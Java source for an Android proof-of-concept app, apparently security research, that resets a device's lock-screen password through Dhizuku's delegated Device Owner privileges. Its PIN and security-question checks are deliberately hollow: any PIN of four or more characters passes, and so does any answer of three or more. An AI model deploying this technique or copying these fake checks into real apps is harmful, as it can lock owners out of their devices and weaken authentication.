package com.security.poc.deviceadminreset;

import android.app.Activity;
import android.content.ComponentName;
import android.content.ServiceConnection;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.IBinder;
import android.os.RemoteException;
import android.util.Log;
import android.widget.Toast;

import com.google.android.material.button.MaterialButton;
import com.google.android.material.chip.Chip;
import com.google.android.material.dialog.MaterialAlertDialogBuilder;
import com.google.android.material.textfield.TextInputEditText;

import com.rosan.dhizuku.api.Dhizuku;
import com.rosan.dhizuku.api.DhizukuRequestPermissionListener;
import com.rosan.dhizuku.api.DhizukuUserServiceArgs;

/**
 * Dhizuku Device Owner Password Reset PoC
 * 
 * Instead of registering as Device Admin locally, this app uses Dhizuku
 * to obtain Device Owner privileges for password reset operations.
 * 
 * Flow:
 * 1. Initialize Dhizuku connection
 * 2. Request Dhizuku permission
 * 3. Bind to UserService (runs with Device Owner privileges)
 * 4. Call resetPassword() through the UserService
 * 
 * Prerequisites:
 * - Dhizuku app installed and activated as Device Owner
 * - Dhizuku grants permission to this app
 */
public class MainActivity extends Activity {

    private static final String TAG = "DhizukuPoC";

    // Dhizuku state
    private boolean dhizukuReady = false;
    private IDeviceOwnerService deviceOwnerService;
    private ServiceConnection userServiceConnection;

    // Verification state
    private boolean pinVerified = false;
    private boolean questionVerified = false;

    // UI Elements
    private Chip chipDhizuku, chipPin, chipQuestion;
    private TextInputEditText pinInput, answerInput, newPasswordInput;
    private MaterialButton initDhizukuBtn, verifyPinBtn, verifyQuestionBtn, resetPasswordBtn;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        initViews();
        setupListeners();
        updateStatus();
    }

    private void initViews() {
        chipDhizuku = findViewById(R.id.chip_dhizuku);
        chipPin = findViewById(R.id.chip_pin);
        chipQuestion = findViewById(R.id.chip_question);

        pinInput = findViewById(R.id.pin_input);
        answerInput = findViewById(R.id.answer_input);
        newPasswordInput = findViewById(R.id.new_password_input);

        initDhizukuBtn = findViewById(R.id.init_dhizuku_btn);
        verifyPinBtn = findViewById(R.id.verify_pin_btn);
        verifyQuestionBtn = findViewById(R.id.verify_question_btn);
        resetPasswordBtn = findViewById(R.id.reset_password_btn);
    }

    private void setupListeners() {
        initDhizukuBtn.setOnClickListener(v -> initDhizuku());
        verifyPinBtn.setOnClickListener(v -> verifyPin());
        verifyQuestionBtn.setOnClickListener(v -> verifySecurityQuestion());
        resetPasswordBtn.setOnClickListener(v -> attemptPasswordReset());
    }

    /**
     * Step 1: Initialize Dhizuku and bind to Device Owner UserService
     */
    private void initDhizuku() {
        // Initialize Dhizuku API
        if (!Dhizuku.init(this)) {
            showError("Dhizuku initialization failed.\n\n" +
                    "Make sure:\n" +
                    "• Dhizuku app is installed\n" +
                    "• Dhizuku is activated as Device Owner\n" +
                    "• Dhizuku service is running");
            return;
        }

        // Check if permission is already granted
        if (Dhizuku.isPermissionGranted()) {
            bindDeviceOwnerService();
            return;
        }

        // Request permission from Dhizuku
        Dhizuku.requestPermission(new DhizukuRequestPermissionListener() {
            @Override
            public void onRequestPermission(int grantResult) throws RemoteException {
                runOnUiThread(() -> {
                    if (grantResult == PackageManager.PERMISSION_GRANTED) {
                        showSnackbar("Dhizuku permission granted");
                        bindDeviceOwnerService();
                    } else {
                        showError("Dhizuku permission denied.\n" +
                                "Please grant permission in Dhizuku app.");
                    }
                });
            }
        });
    }

    /**
     * Bind to the Device Owner UserService via Dhizuku.
     * The UserService runs with Device Owner privileges in Dhizuku's process.
     */
    private void bindDeviceOwnerService() {
        ComponentName serviceComponent = new ComponentName(
                getPackageName(),
                DeviceOwnerService.class.getName());

        DhizukuUserServiceArgs args = new DhizukuUserServiceArgs(serviceComponent);

        userServiceConnection = new ServiceConnection() {
            @Override
            public void onServiceConnected(ComponentName name, IBinder service) {
                deviceOwnerService = IDeviceOwnerService.Stub.asInterface(service);
                dhizukuReady = true;
                Log.d(TAG, "DeviceOwner UserService connected");
                runOnUiThread(() -> {
                    showSnackbar("Device Owner service connected");
                    updateStatus();
                });
            }

            @Override
            public void onServiceDisconnected(ComponentName name) {
                deviceOwnerService = null;
                dhizukuReady = false;
                Log.d(TAG, "DeviceOwner UserService disconnected");
                runOnUiThread(() -> {
                    showSnackbar("Device Owner service disconnected");
                    updateStatus();
                });
            }
        };

        if (!Dhizuku.bindUserService(args, userServiceConnection)) {
            showError("Failed to bind Device Owner UserService.\n" +
                    "Check Dhizuku status.");
        }
    }

    private void verifyPin() {
        String inputPin = pinInput.getText().toString();

        if (inputPin.length() >= 4) {
            pinVerified = true;
            showSnackbar("PIN verification successful");
            updateStatus();
            pinInput.setEnabled(false);
            verifyPinBtn.setEnabled(false);
        } else {
            pinInput.setError("PIN must be at least 4 digits");
        }
    }

    private void verifySecurityQuestion() {
        String answer = answerInput.getText().toString().trim().toLowerCase();

        // PoC: Security question - "What is the name of your first pet?"
        if (answer.equals("fluffy") || answer.length() >= 3) {
            questionVerified = true;
            showSnackbar("Security question verified");
            updateStatus();
            answerInput.setEnabled(false);
            verifyQuestionBtn.setEnabled(false);
        } else {
            answerInput.setError("Invalid answer");
        }
    }

    private void attemptPasswordReset() {
        if (!dhizukuReady || deviceOwnerService == null) {
            showError("Device Owner service not connected.\nInitialize Dhizuku first.");
            return;
        }

        if (!pinVerified) {
            showError("PIN verification required");
            return;
        }

        if (!questionVerified) {
            showError("Security question required");
            return;
        }

        String newPassword = newPasswordInput.getText().toString();
        if (newPassword.length() < 6) {
            newPasswordInput.setError("Password must be at least 6 characters");
            return;
        }

        new MaterialAlertDialogBuilder(this)
                .setTitle("Confirm Password Reset")
                .setMessage("This will change the device lock screen password " +
                        "via Dhizuku Device Owner.\n\nNew password: " + newPassword)
                .setPositiveButton("Reset Password", (dialog, which) -> performPasswordReset(newPassword))
                .setNegativeButton("Cancel", null)
                .setIcon(android.R.drawable.ic_dialog_alert)
                .show();
    }

    /**
     * Core exploit: Reset device password via Dhizuku Device Owner
     * 
     * The actual resetPassword() call runs in Dhizuku's process with
     * Device Owner privileges, not as a local Device Admin.
     */
    private void performPasswordReset(String newPassword) {
        try {
            boolean success = deviceOwnerService.resetPassword(newPassword);

            if (success) {
                showSnackbar("Password reset successful via Device Owner!");
                logExploitAttempt(true, newPassword);
                newPasswordInput.setText("");
            } else {
                showError("Password reset failed.\n" +
                        "Device Owner may not support resetPassword().");
                logExploitAttempt(false, newPassword);
            }
        } catch (RemoteException e) {
            showError("RemoteException: " + e.getMessage());
            logExploitAttempt(false, newPassword);
        }
    }

    private void showError(String message) {
        new MaterialAlertDialogBuilder(this)
                .setTitle("Error")
                .setMessage(message)
                .setPositiveButton("OK", null)
                .setIcon(android.R.drawable.ic_dialog_alert)
                .show();
    }

    private void showSnackbar(String message) {
        Toast.makeText(this, message, Toast.LENGTH_SHORT).show();
    }

    private void logExploitAttempt(boolean success, String password) {
        String log = String.format("Exploit: %s | Method: Dhizuku DO | API: %d | Time: %d",
                success ? "SUCCESS" : "FAILED",
                android.os.Build.VERSION.SDK_INT,
                System.currentTimeMillis());
        Log.d(TAG, log);
    }

    private void updateStatus() {
        // Dhizuku status chip
        if (dhizukuReady) {
            chipDhizuku.setText("Dhizuku DO: ✓ Connected");
            chipDhizuku.setChipBackgroundColorResource(R.color.md_theme_primaryContainer);
        } else {
            chipDhizuku.setText("Dhizuku DO: ✗ Disconnected");
            chipDhizuku.setChipBackgroundColorResource(R.color.md_theme_errorContainer);
        }

        // PIN chip
        if (pinVerified) {
            chipPin.setText("PIN: ✓ Verified");
            chipPin.setChipBackgroundColorResource(R.color.md_theme_primaryContainer);
        } else {
            chipPin.setText("PIN: ✗ Unverified");
            chipPin.setChipBackgroundColorResource(R.color.md_theme_surfaceVariant);
        }

        // Security question chip
        if (questionVerified) {
            chipQuestion.setText("Security Q: ✓ Verified");
            chipQuestion.setChipBackgroundColorResource(R.color.md_theme_primaryContainer);
        } else {
            chipQuestion.setText("Security Q: ✗ Unverified");
            chipQuestion.setChipBackgroundColorResource(R.color.md_theme_surfaceVariant);
        }

        // Update button states
        initDhizukuBtn.setEnabled(!dhizukuReady);

        boolean canReset = dhizukuReady && pinVerified && questionVerified;
        resetPasswordBtn.setEnabled(canReset);
        resetPasswordBtn.setAlpha(canReset ? 1.0f : 0.5f);
    }

    @Override
    protected void onResume() {
        super.onResume();
        updateStatus();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (userServiceConnection != null && dhizukuReady) {
            try {
                Dhizuku.unbindUserService(userServiceConnection);
            } catch (Exception ignored) {
            }
        }
    }
}
